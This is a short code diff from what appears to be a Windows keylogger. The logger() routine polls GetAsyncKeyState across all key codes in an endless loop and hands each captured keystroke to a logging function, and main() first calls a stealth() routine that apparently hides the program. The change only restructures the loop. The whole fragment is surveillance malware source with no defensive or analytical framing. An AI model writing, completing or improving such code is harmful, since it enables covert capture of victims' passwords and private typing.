@@ -568,12 +568,15 @@ void checkForLog(int Key)
 
 void logger()
 {
-    Sleep(10);
-    for (int i = 1; i <= 254; i++)
+    while (true)
     {
-        if (GetAsyncKeyState(i) == -32767)
+        Sleep(10);
+        for (int i = 1; i <= 254; i++)
         {
-            checkForLog(i);
+            if (GetAsyncKeyState(i) == -32767)
+            {
+                checkForLog(i);
+            }
         }
     }
 }
@@ -589,9 +592,6 @@ void stealth()
 main()
 {
     stealth();
-    while (true)
-    {
-        logger();
-    }
+    logger();
     return 0;
 }
